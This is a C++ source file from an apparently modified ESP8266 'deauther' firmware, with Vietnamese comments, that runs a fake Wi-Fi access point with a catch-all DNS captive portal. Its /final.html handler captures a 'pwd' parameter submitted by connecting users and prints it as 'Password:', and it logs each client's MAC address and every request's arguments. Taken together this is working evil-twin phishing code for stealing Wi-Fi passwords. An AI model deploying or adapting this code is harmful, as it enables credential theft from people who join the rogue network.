/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */
#include "ap.h"
#include "debug.h"
#include "strh.h"
#include "scan.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <DNSServer.h>
#include <FS.h>
extern "C" {
#include "user_interface.h"
}

typedef struct ap_settings_t {
    bool enabled;
    bool paused;
    char ssid[33];
    char pswd[65];
    uint8_t ch;
    bool hidden;
    uint8_t bssid[6];
} ap_settings_t;

namespace ap {
    // ========== PRIVATE ========= //
    ESP8266WebServer server(80);
    DNSServer dnsServer;
    //Sửa lỗi captive portal không hiển thị popup ở một số thiết bị ở dòng này
    IPAddress apIP(8, 8, 8, 8);
    IPAddress netMsk(255, 255, 255, 0);
    ap_settings_t ap_settings;
    
    uint8_t* client_to_mac(IPAddress ip) {
        unsigned char number_client;
        struct station_info* stat_info;
        
        number_client= wifi_softap_get_station_num();
        stat_info = wifi_softap_get_station_info();
        /*
        debuglnF("[ ========= Clients ========= ]");

        if(number_client == 0) {
            debuglnF("No clients connected");
            return;
        }
        debuglnF("ID IP-Address MAC-Address");
        debuglnF("====================================");
        */    
        int i { 0 };
        struct ip_addr* IPaddress;
        IPAddress address;

        while (stat_info) {
            IPaddress = (ip_addr *)&stat_info->ip;
            address = IPaddress->addr;
            
            if(address == ip) {
                return stat_info->bssid;/*
                debug(strh::right(2, String(i)));
                debug(' ');
                debug(strh::left(15, address.toString()));
                debug(' ');
                debug(strh::left(17, strh::mac(stat_info->bssid)));
                debugln();*/
            }
            stat_info = STAILQ_NEXT(stat_info, next);
            ++i;
        }

        //debuglnF("====================================");
        //debugln();

        return NULL;
    }

    void handle_404() {


        IPAddress remoteIP = server.client().remoteIP();
        uint8_t* clientMAC = client_to_mac(remoteIP);
        
        SPIFFS.begin();
        File htmlFile = SPIFFS.open("/index.html", "r");
        String htmlContent = htmlFile.readString();
        htmlFile.close();
        server.send(200, "text/html", htmlContent);
        debug(strh::left(17, strh::mac(clientMAC)));
        debug(' ');


        
        debug(server.uri());
        for (int i = 0; i < server.args(); i++) {
            debug(i==0?'?':'&');
            debug(server.argName(i));
            debug("=");
            debug(server.arg(i));
        }

        debugln();
    }

    // ========== PUBLIC ========= //
    void start(String& ssid, String& pswd, bool hidden, uint8_t ch, uint8_t* bssid) {
        if (ssid.length() == 0) {
            debugln("ERROR: SSID empty");
            return;
        }

        if (ssid.length() > 32) {
            debugln("WARNING: SSID longer than 32 characters");
            ssid = ssid.substring(0, 32);
        }

        if (pswd.length() > 0 && pswd.length() < 8) {
            debugln("WARNING: Password must have at least 8 characters");
            pswd = String();
        }

        if(ch < 1 || ch > 14) {
            debugln("WARNING: Channel must be between 1-14");
            ch = 1;
        }

        stop();
        scan::stopST();

        ap_settings.enabled = true;
        ap_settings.paused = false;
        strncpy(ap_settings.ssid, ssid.c_str(), 32);
        strncpy(ap_settings.pswd, pswd.c_str(), 64);
        ap_settings.hidden = hidden;
        ap_settings.ch = ch;
        memcpy(ap_settings.bssid, bssid, 6);

        wifi_set_macaddr(SOFTAP_IF, ap_settings.bssid);
        WiFi.softAPConfig(apIP, apIP, netMsk);
        WiFi.softAP(ap_settings.ssid, ap_settings.pswd, ap_settings.ch, ap_settings.hidden);

        dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
        dnsServer.start(53, "*", apIP);

        MDNS.begin("deauth.me");

        //Mở các file html, css, javascript khi trang được tải
        SPIFFS.begin();

        server.on("/bootstrap.min.css", HTTP_GET, [](){
            File fileCss = SPIFFS.open("/bootstrap.min.css", "r");
            size_t sent = server.streamFile(fileCss, "text/css");
            fileCss.close();
        });
        
        server.on("/jquery.min.js", HTTP_GET, [](){
            File fileJquery = SPIFFS.open("/jquery.min.js", "r");
            size_t sent = server.streamFile(fileJquery, "application/javascript");
            fileJquery.close();
        });
        
        server.on("/bootstrap.min.js", HTTP_GET, [](){
            File fileBootStrap = SPIFFS.open("/bootstrap.min.js", "r");
            size_t sent = server.streamFile(fileBootStrap, "application/javascript");
            fileBootStrap.close();
        });

        server.on("/final.html", HTTP_GET, [](){
            File fileFinal = SPIFFS.open("/final.html", "r");
            size_t sent = server.streamFile(fileFinal, "text/html");
            fileFinal.close();
            String pwd = server.arg("pwd");
            debug("Password: "); //Hiển thị dòng có tên "Password: " ra màn hình
            debugln(pwd); //In ra giá trị của biến pwd
        });

        server.onNotFound(handle_404);

        server.begin();

        debuglnF("[ ========= Access Point ========= ]");

        debugF("SSID:      ");
        debugln(ap_settings.ssid);

        debugF("Password:  ");
        debugln(ap_settings.pswd);

        debugF("Mode:      ");
        debugln(ap_settings.pswd == '\0' ? "WPA2" : "Open");

        debugF("Hidden:    ");
        debugln(strh::boolean(ap_settings.hidden));

        debugF("Channel:   ");
        debugln(ap_settings.ch);

        debugF("BSSID:     ");
        debugln(strh::mac(ap_settings.bssid));

        debugln();

        debuglnF("Type 'stop ap' to stop the access point");

        debuglnF("[ =================== Connections =================== ]");
//        debugF("IP-Address:  ");
//        debug(' ');
        debugF("MAC-Address:     ");
        debug(' ');
        debuglnF("URL: ");
//        debuglnF("======================================================");
    }

    void stop() {
        if (ap_settings.enabled || ap_settings.paused) {
            WiFi.persistent(false);
            WiFi.disconnect(true);
            WiFi.mode(WIFI_STA);
            wifi_set_opmode(STATION_MODE);

            ap_settings.enabled = false;
            ap_settings.paused = false;
            
            debuglnF("> Stopped access point");
            debugln();
        }
    }
    
    void pause() {
        if (ap_settings.enabled && !ap_settings.paused) {
            stop();
            ap_settings.paused = true;
        }
    }

    void resume() {
        if (!ap_settings.enabled && ap_settings.paused) {
            WiFi.softAP(ap_settings.ssid, ap_settings.pswd, ap_settings.ch, ap_settings.hidden);

            ap_settings.enabled = true;
            ap_settings.paused = false;
            
            debuglnF("> Resumed access point");
            debugln();
        }
    }

    bool paused() {
        return ap_settings.paused;
    }

    void update() {
        if(ap_settings.enabled) {
            server.handleClient();
            MDNS.update();
            dnsServer.processNextRequest();
       
        }
    }
}

